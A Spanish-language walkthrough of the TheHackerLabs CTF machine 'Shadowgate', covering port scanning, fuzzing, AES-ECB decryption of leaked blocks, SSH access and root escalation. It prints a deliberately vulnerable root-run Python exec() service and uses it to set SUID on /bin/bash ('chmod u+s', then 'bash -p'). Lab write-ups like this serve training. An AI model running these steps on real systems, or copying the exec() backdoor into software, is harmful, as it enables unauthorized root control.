---
title: "Shadowgate - TheHackerLabs"
date: 2026-03-15
draft: false
slug: "THL-writeup-shadowgate"
excerpt: "Esta fue una máquina bastante complicada. Después de analizar los escaneos, nos conectamos al servicio expuesto en el puerto 56789, en el que descubrimos que, al pasarle una frase que te muestra al conectarse, se nos devuelven varias cadenas codificadas en base64. A su vez, nos dirigimos a la página web activa en el puerto 8080 para aplicarle Fuzzing, encontrando una ruta que nos lleva a un login que solo acepta peticiones POST, pero que nos pide un usuario que, de momento, no tenemos. Investigando las cadenas que obtuvimos anteriormente, descubrimos que son bloques encriptados en AES-ECB, que logramos desencriptar e identificamos que algunos caracteres no cambian, siendo estos el usuario que necesita el login. Una vez que das este dato, el login te indica que debes buscar una nueva ruta para colocar un token. Volvemos a aplicar Fuzzing y descubrimos la ruta faltante, que al darle el token nos indica un cambio en un servicio, siendo este cambio reflejado en el servicio del puerto 56789, que al volver a conectarnos, nos da las credenciales de acceso al servicio SSH. Dentro de la máquina víctima, descubrimos un servicio interno que resulta ser un intérprete de Python que puede ejecutar comandos/scripts como Root. Exponemos este servicio aplicando Local Port Forwarding y logramos darle permisos SUID a la Bash para poder escalar privilegios y convertirnos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Web Enumeration", "Fuzzing", "Analizing and Abusing of Customized Service", "BurpSuite", "Decrypting AES-ECB Blocks", "Local Port Forwarding", "Abusing Python's Custom Built-In Interpreter", "Privesc - Abusing Python's Custom Built-In Interpreter", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "nc"
  - "base64"
  - "echo"
  - "ffuf"
  - "gobuster"
  - "sha256sum"
  - "openssl"
  - "CyberChef"
  - "python3"
  - "BurpSuite"
  - "nxc"
  - "ssh"
  - "ss"
  - "grep"
  - "bash"
links:
  - "https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/"
  - "https://gchq.github.io/CyberChef/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-shadowgate/shadowgate.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.220
PING 192.168.100.220 (192.168.100.220) 56(84) bytes of data.
64 bytes from 192.168.100.220: icmp_seq=1 ttl=64 time=1.48 ms
64 bytes from 192.168.100.220: icmp_seq=2 ttl=64 time=0.731 ms
64 bytes from 192.168.100.220: icmp_seq=3 ttl=64 time=0.849 ms
64 bytes from 192.168.100.220: icmp_seq=4 ttl=64 time=0.913 ms

--- 192.168.100.220 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3045ms
rtt min/avg/max/mdev = 0.731/0.992/1.475/0.286 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.220 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 11:40 -0600
Initiating ARP Ping Scan at 11:40
Scanning 192.168.100.220 [1 port]
Completed ARP Ping Scan at 11:40, 0.44s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:40
Scanning 192.168.100.220 [65535 ports]
Discovered open port 22/tcp on 192.168.100.220
Discovered open port 8080/tcp on 192.168.100.220
Discovered open port 56789/tcp on 192.168.100.220
Completed SYN Stealth Scan at 11:40, 9.04s elapsed (65535 total ports)
Nmap scan report for 192.168.100.220
Host is up, received arp-response (0.0012s latency).
Scanned at 2026-03-10 11:40:32 CST for 9s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 64
8080/tcp  open  http-proxy syn-ack ttl 64
56789/tcp open  unknown    syn-ack ttl 64
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.67 seconds
           Raw packets sent: 65546 (2.884MB) | Rcvd: 65546 (2.622MB
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Encontramos 3 puertos abiertos, pero me da curiosidad el **puerto 8080** y el **puerto 56789**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,8080,56789 192.168.100.220 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 11:41 -0600
Nmap scan report for 192.168.100.220
Host is up (0.00080s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 84:05:fe:ed:47:16:ab:28:70:0f:44:6e:f6:8d:0c:6f (ECDSA)
|_  256 99:a9:88:76:ee:c8:ed:ce:73:57:2a:22:da:9f:7b:7e (ED25519)
8080/tcp  open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)

|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: 403 Forbidden
56789/tcp open  unknown

| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest: 
|     Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely
|     patterns hide in the noise. Sequence always matters.
|     Access denied. The gate remains closed.
|   NULL: 
|     Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely
|     patterns hide in the noise. Sequence always matters.
|_    Listening... but no response.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port56789-TCP:V=7.98%I=7%D=3/10%Time=69B057B5%P=x86_64-pc-linux-gnu%r(N
SF:ULL,AA,"Shadow\x20Gate\x20v1\.0\x20::\x20Not\x20all\x20doors\x20are\x20
SF:locked\.\x20Some\x20wait\x20for\x20n0cturne\.\x20Listen\x20closely\xe2\
SF:x80\x94patterns\x20hide\x20in\x20the\x20noise\.\x20Sequence\x20always\x
SF:20matters\.\nListening\.\.\.\x20but\x20no\x20response\.\n")%r(GenericLi
SF:nes,B4,"Shadow\x20Gate\x20v1\.0\x20::\x20Not\x20all\x20doors\x20are\x20
SF:locked\.\x20Some\x20wait\x20for\x20n0cturne\.\x20Listen\x20closely\xe2\
SF:x80\x94patterns\x20hide\x20in\x20the\x20noise\.\x20Sequence\x20always\x
SF:20matters\.\nAccess\x20denied\.\x20The\x20gate\x20remains\x20closed\.\n
SF:")%r(GetRequest,B4,"Shadow\x20Gate\x20v1\.0\x20::\x20Not\x20all\x20door
SF:s\x20are\x20locked\.\x20Some\x20wait\x20for\x20n0cturne\.\x20Listen\x20
SF:closely\xe2\x80\x94patterns\x20hide\x20in\x20the\x20noise\.\x20Sequence
SF:\x20always\x20matters\.\nAccess\x20denied\.\x20The\x20gate\x20remains\x
SF:20closed\.\n")%r(HTTPOptions,B4,"Shadow\x20Gate\x20v1\.0\x20::\x20Not\x
SF:20all\x20doors\x20are\x20locked\.\x20Some\x20wait\x20for\x20n0cturne\.\
SF:x20Listen\x20closely\xe2\x80\x94patterns\x20hide\x20in\x20the\x20noise\
SF:.\x20Sequence\x20always\x20matters\.\nAccess\x20denied\.\x20The\x20gate
SF:\x20remains\x20closed\.\n")%r(RTSPRequest,B4,"Shadow\x20Gate\x20v1\.0\x
SF:20::\x20Not\x20all\x20doors\x20are\x20locked\.\x20Some\x20wait\x20for\x
SF:20n0cturne\.\x20Listen\x20closely\xe2\x80\x94patterns\x20hide\x20in\x20
SF:the\x20noise\.\x20Sequence\x20always\x20matters\.\nAccess\x20denied\.\x
SF:20The\x20gate\x20remains\x20closed\.\n")%r(RPCCheck,B4,"Shadow\x20Gate\
SF:x20v1\.0\x20::\x20Not\x20all\x20doors\x20are\x20locked\.\x20Some\x20wai
SF:t\x20for\x20n0cturne\.\x20Listen\x20closely\xe2\x80\x94patterns\x20hide
SF:\x20in\x20the\x20noise\.\x20Sequence\x20always\x20matters\.\nAccess\x20
SF:denied\.\x20The\x20gate\x20remains\x20closed\.\n")%r(DNSVersionBindReqT
SF:CP,B4,"Shadow\x20Gate\x20v1\.0\x20::\x20Not\x20all\x20doors\x20are\x20l
SF:ocked\.\x20Some\x20wait\x20for\x20n0cturne\.\x20Listen\x20closely\xe2\x
SF:80\x94patterns\x20hide\x20in\x20the\x20noise\.\x20Sequence\x20always\x2
SF:0matters\.\nAccess\x20denied\.\x20The\x20gate\x20remains\x20closed\.\n"
SF:);
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.69 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Después de analizar los escaneos, esto es lo más destacado:
* La página web activa en el **puerto 8080** parece que solo muestra el **código de estado 403**, por lo que puede que no tengamos acceso a la página o no estamos entrando a la ruta correcta.
* El servicio del **puerto 56789** muestra algunos mensajes y parece que podemos conectarnos a este.

Antes de ir a la página web, investiguemos un poco más sobre el servicio del **puerto 56789**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio Activo en Puerto 56789 {#Puerto56789}

Probemos a conectarnos a ese puerto usando **netcat**:
```bash
nc 192.168.100.220 56789
Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.

Access denied. The gate remains closed
```
Necesitamos alguna clave o una contraseña para que nos dé acceso a lo que sea que muestre.

Curiosamente, el mensaje tiene la frase **n0cturne**, que parece más una contraseña o clave agregada intencionalmente.

Probémosla:
```bash
nc 192.168.100.220 56789
Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
n0cturne
Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.

YzRmN2QzNQ==
u6wLUZqVjHq9zqkk1AUGKQ==
Bh5flJ0ipCSwSEFszeH3JQ==
i0xh/Dcf2rhD+aN+gTsRtg==
7qxQxcO+lgqcUMwUs2dJdw==
Z0ypLNpNI3eYPsHjf1cwIA==
SFHenVqViVg4OzTZqHEqog==
j8tFlkw7uB6pJZkeWhOKug==
qeSKHCpwYueNcMwnC5izWg==
Connection closing...
```
Obtuvimos respuesta y vemos varios strings codificados en **base64**.

Al tratar de decodificarlas, no podremos leer el contenido, ya que verás bytes crudos que nos dan a entender que los datos están cifrados:
```bash
echo -n "YzRmN2QzNQ==" | base64 -d
c4f7d35
echo -n "u6wLUZqVjHq9zqkk1AUGKQ==" | base64 -d
��
  Q���z�Ω$�)                                                                                                                                                                                              
echo -n "Bh5flJ0ipCSwSEFszeH3JQ==" | base64 -d
_��"�$�HAl���%
...
```

También los podemos decodificar con la herramienta **CyberChef**:
* <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>

Pruébalo:

<p align="center">
<img src="/assets/images/THL-writeup-shadowgate/Captura1.png">
</p>

Si volvemos a conectarnos a este servicio y lo ejecutamos, nos darán distintos resultados, a excepción del primero, ya que parece que ese no cambia nunca:
```bash
echo -n "YzRmN2QzNQ==" | base64 -d
c4f7d35
```
Tomemos en cuenta esto para más adelante.

Investiguemos la página web, quizá encontremos una ruta válida si aplicamos **Fuzzing**.

### Fuzzing {#fuzz}

Primero probemos con la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://192.168.100.220:8080/FUZZ -fs 213

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.220:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 213
________________________________________________

login                   [Status: 200, Size: 39, Words: 7, Lines: 1, Duration: 49ms]
:: Progress: [128623/128623] :: Job [1/1] :: 295 req/sec :: Duration: [0:06:52] :: Errors: 1 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-fs*	     | Para aplicar un filtro que no muestre respuestas de un tamaño específico. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.220:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -s 200,301 -b "" --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://192.168.100.220:8080
[+] Method:         GET
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.8.2
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login                (Status: 200) [Size: 39]
Progress: 128623 / 128623 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-s*	     | Para aplicar un filtro que muestre solo los códigos de estado específicos. |
| *-b*	     | Para que funcione el filtro anterior. |
| *--ne*     | Para que no muestre errores. |

Muy bien, en ambas parece que encontramos un login.

Pero al entrar nos da este mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-shadowgate/Captura2.png">
</p>

Al mencionar un método incorrecto, supongo que debe ser por método **POST** para poder agregar un usuario y contraseña.

Podemos probarlo con **BurpSuite**, capturando esta petición y mandándola al **Repeater**, pero recuerda cambiar la petición cuando la tenga en el **Repeater** para que se convierta 
en **petición POST**.

Normalmente, estos datos se ponen con los parámetros `username=` y `password=`:

<p align="center">
<img src="/assets/images/THL-writeup-shadowgate/Captura3.png">
</p>

Se acepta la petición, pero el usuario es incorrecto.

Ahora debemos buscar un usuario válido, pero todo parece indicar que quien oculta este dato será el servicio del **puerto 56789**.

## Explotación de Vulnerabilidades {#Explotacion}

### Desencriptando Bloques Cifrados con AES-ECB {#AES-ECB}

Investigando qué podríamos hacer con las respuestas del **puerto 56789**, y con ayuda de **ChatGPT**, encontramos lo siguiente:
* Cada cadena decodificada (a excepción de la primera) tiene un tamaño de 16 bytes.
* La primer cadena parece más alguna clave, un **salt**, un hash o un seed.
* La cantidad de bytes de cada cadena puede que pertenezca al **cifrado AES**.
* Si las cadenas están cifradas en **AES**, debemos encontrar el modo de operación para descifrarlas.

Aquí dejo algunas definiciones importantes:

| **Cifrado AES** |
|:---------------:|
| *Advanced Encryption Standard (AES) es un algoritmo de cifrado simétrico de bloque utilizado para proteger información mediante la transformación de datos en texto cifrado usando una clave secreta. Algunas de sus caracteristicas principales son: es un cifrado simétrico, opera sobre bloques de 128 bits (16 bytes), soporta claves de 128, 192 y 256 bits, etc.* |

| **Modo de Operación de AES** |
|:----------------------------:|
| *Un modo de operación define cómo aplicar un cifrado de bloque como AES a mensajes de longitud arbitraria, especificando cómo se encadenan o combinan los bloques durante el proceso de cifrado. Existen los siguientes modos: ECB (Electronic Codebook), CBC (Cipher Block Chaining) y CTR (Counter Mode)* |

No hay una forma clara de qué podamos identificar que **modo de operación** se utilizó, por lo que tendremos que probar algunas formas de desencriptar cada bloque en **base64**.

Enfoquémonos en el **modo de operación ECB (Electronic Codebook)**.

En el siguiente blog se menciona cómo desencriptar un bloque que fue encriptado con **AES - ECB**:
* <a href="https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/" target="_blank">Reddit: How do you decode AES ECB?</a>

Para poder hacer esto, necesitaremos lo siguiente:
* La llave que se usó para encriptar el bloque, convertida en un **Hash SHA256**.
* El bloque sin que esté codificado en **base64**.
* El **padding**, pero esto depende de la cantidad de bytes del bloque encriptado y los que tenemos son de 16 bytes, lo que indica que no tiene **padding**.

Vemos que tenemos todo, a excepción de la llave, pero como tenemos de pista que puede ser el primer bloque que encontramos, tan solo vamos a convertirla en un **Hash SHA256**:
```bash
echo -n "c4f7d35" | sha256sum
7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -
```

Y usaremos el siguiente comando para desencriptar el bloque:
```bash
openssl enc -aes-256-ecb -d -K HashCopiadoSHA256 -nopad -in cadena1.bin
```
El archivo **cadena.bin** almacena cualquier cadena decodificada en **base64**.

Probemos:
```bash
openssl enc -aes-256-ecb -d -K 7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75 -nopad -in cadena1.bin
vI-.LGFe+WonYhS~
```
Excelente, funcionó. Ahora desencriptemos cada cadena.

#### Desencriptando Bloques AES-ECB con CyberChef y Script de Python {#CyberChefPython}

Hacerlo una por una es bastante tedioso, por lo que automatizaremos la forma de desencriptar cada cadena de forma rápida.

Primero usaremos **CyberChef**:
* <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>

Y utilizaremos las siguientes operaciones:
* **Fork**
* **From Base64**
* **AES Decrypt**

Quedaría de la siguiente forma:

<p align="center">
<img src="/assets/images/THL-writeup-shadowgate/Captura4.png">
</p>

Excelente, tenemos cada cadena desencriptada.

Ahora bien, aprovechando la ayuda de **ChatGPT**, podemos usar el siguiente script de **Python** para automatizar la desencriptación:
```python
from Crypto.Cipher import AES
import hashlib
import base64

seed = "c4f7d35"

# Llave en SHA256
key = hashlib.sha256(seed.encode()).digest()

# Crear descifrador AES ECB
cipher = AES.new(key, AES.MODE_ECB)

with open("output.txt") as f:
    for line in f:
        block = line.strip()
        ciphertext = base64.b64decode(block)
        plaintext = cipher.decrypt(ciphertext)
        print(plaintext)
```
Solo necesitarás guardar todos los bloques que están en **base64**, a excepción del primero, que es la llave, dentro de un archivo de texto con el nombre **output.txt**, pero ese 
nombre se puede cambiar a tu gusto.

Aparte, necesitarás tener instalada la siguiente librería:
```bash
pip3 install pycryptodome
```
Te recomiendo hacerlo en un ambiente virtual de **Python**.

Ya solo ejecútalo y observa el resultado:
```bash
python3 decryptAES.py
b'vI-.LGFe+WonYhS~'
b'4w1[gb=w0#7@`w\\!'
b'u_Ga.0>?Lq~X?tO#'
b"1't{Aa(4wJdJAh5]"
b'tm:gnn8\\j}/[sf#A'
b'g/i-eS}m}Bpd@9jq'
b"x)V~LizZz6uR?M'u"
b'9q7ddl1l>T!EX9Ln'
```
En ambos casos, podemos ver que los resultados son muy distintos, pero con la diferencia importante de que el primer carácter nunca cambia.

Si copiamos y pegamos cada carácter inicial dentro de la petición del login, pero como un usuario, obtendremos la siguiente respuesta:

<p align="center">
<img src="/assets/images/THL-writeup-shadowgate/Captura5.png">
</p>

Encontramos el usuario correcto, pero nos dice que debemos encontrar una ruta donde colocar un token, que parece más un **código OTP** y se nos da uno como una cabecera,

Tendremos que aplicar **Fuzzing** de nuevo.

### Identificando Ruta para Colocar Token y Ganando Acceso a la Máquina Víctima Vía SSH {#fuzz2SSH}

Busquemos esa ruta con la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -X POST -u http://192.168.100.220:8080/FUZZ -mc 200 -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.100.220:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

login                   [Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 184ms]
verify                  [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 201ms]
:: Progress: [128370/128370] :: Job [1/1] :: 254 req/sec :: Duration: [0:11:23] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-X*	     | Para indicar un método específico a utilizar. |
| *-u*       | Para indicar la URL a utilizar. |
| *-mc*	     | Para indicar un filtro que solo busque resultados con un código de estado específico. |
| *-H*	     | Para indicar una cabecera específica a usar. |

Excelente, encontramos la ruta.

Apuntemos a ella desde la petición que capturamos con **BurpSuite** y usemos el parámetro `token=` para ver si funciona:

<p align="center">
<img src="/assets/images/THL-writeup-shadowgate/Captura6.png">
</p>

Sí funcionó.

Dale el token correcto:

<p align="center">
<img src="/assets/images/THL-writeup-shadowgate/Captura7.png">
</p>

Nos dicen que se activó un servicio, pero al escanear la máquina no vemos nada.

Pero al entrar de nuevo al **puerto 56789**, obtendremos una respuesta distinta:
```bash
nc 192.168.100.220 56789
Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
SSH login for user mars
mars:**********
Connection closing...
```
Nos dio credenciales para entrar al **servicio SSH**.

Comprobemos si funcionan:
```bash
nxc ssh 192.168.100.220 -u 'mars' -p '**********'
SSH         192.168.100.220   22     192.168.100.220    [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11
SSH         192.168.100.220   22     192.168.100.220    [+] mars:**********  Linux - Shell access!
```
Sí funcionan.

Entremos:
```bash
ssh mars@192.168.100.220
mars@192.168.100.220's password: 
Last login: Tue Mar 10 20:43:42 2026
mars@TheHackersLabs-Shadowgate:~$ whoami
mars
```
Ya estamos dentro.

Aquí encontraremos la flag del usuario:
```bash
mars@TheHackersLabs-Shadowgate:~$ ls
user.txt
mars@TheHackersLabs-Shadowgate:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Aplicando Local Port Forwarding para Abusar de Servicio Interno y Escalar Privilegios {#Privesc}

Actualmente, nuestro usuario no tiene ningún privilegio, pero al realizar la enumeración, podremos encontrar los siguientes scripts en la ruta `/opt/shadowgate/bin`:
```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la
total 20
drwxr-xr-x 2 root root 4096 may  3  2025 .
drwxr-xr-x 4 root root 4096 may  2  2025 ..
-rw-r--r-- 1 root root 2462 may  3  2025 gate.py
-rwxr-xr-x 1 root root 1060 may  3  2025 shadow-client.py
-rw-r--r-- 1 root root 3304 may  3  2025 web-login.py
```
Revisándolos, veremos que son los servicios desplegados que atacamos y todos son ejecutados por el **Root**.

Pero el único que no hemos visto activo es el servicio que despliega el script **shadow-client.py**:
```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ cat shadow-client.py 
#!/usr/bin/env python3
import socket
import threading
import io
import contextlib

def handle_client(client_socket):
    client_socket.send(b"Welcome to Shadow Client Helper\n")
    client_socket.send(b"This is an unrestricted environment. Good luck, hacker.\n")
    while True:
        client_socket.send(b">>> ")
        code = client_socket.recv(1024).decode().strip()
        try:
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                exec(code, globals())
            result = output.getvalue()
            if result.strip():
                client_socket.send(result.encode())
        except Exception as e:
            client_socket.send(f"Error: {e}\n".encode())

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 4444))
    server.listen(5)
    while True:
        client, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    main()
```
A primera vista parece ser solo una conexión a un servicio interno (**localhost**) por el **puerto 4444**, pero analizando el código podemos ver que se trata de un intérprete de **Python**,
pues no solo vemos que simula el prompt de **Python**, sino que vemos la función `exec(code, globals())`, lo que indica que puede ejecutar cualquier comando que le mandemos, pero solo 
en **Python**.

En resumen, este script crea un intérprete de **Python** de uso interno que permite ejecutar comandos/scripts.

Comprobemos con el comando **ss** y **grep**:
```bash
mars@TheHackersLabs-Shadowgate:~$ ss -tulnp | grep 4444
tcp   LISTEN 0      5                              127.0.0.1:4444       0.0.0.0:*
```
Ahí está, sí está activo ese servicio.

Para que podamos conectarnos, vamos a aplicar **Local Port Forwarding** aprovechando que tenemos acceso a la máquina vía SSH, y mantendremos la sesión activa para realizar cualquier 
movimiento necesario: 
```bash 
ssh -L 4444:0.0.0.0:4444 mars@192.168.100.220
mars@192.168.100.220's password:
...
Last login: Mon Mar 16 04:51:52 2026
mars@TheHackersLabs-Shadowgate:~$ 
```
Funcionó y puedes comprobarlo con **ss** en tu máquina.

Ya podemos conectarnos a ese servicio apuntando al localhost y al puerto que hayamos elegido:
```bash
nc 127.0.0.1 4444
Welcome to Shadow Client Helper
This is an unrestricted environment. Good luck, hacker.
>>>
```
Estamos dentro.

Ahora, ya vimos que este servicio lo corre el **Root**, por lo que podemos darle **permisos SUID** a la **Bash** para escalar privilegios.

Primero, veamos qué permisos tiene la **Bash**:
```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
```

Ahora, desde el servicio activo, vamos a cargar la librería **os** de **Python** y luego le damos **permisos SUID** a la **Bash**:
```bash
>>> import os 
>>> os.system('chmod u+s /bin/bash')
```

Comprobemos si funcionó:
```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
```

Excelente, ya solo ejecutamos la **Bash** con privilegios:
```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ bash -p
bash-5.2# whoami
root
```
Somos **Root**.

Busquemos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
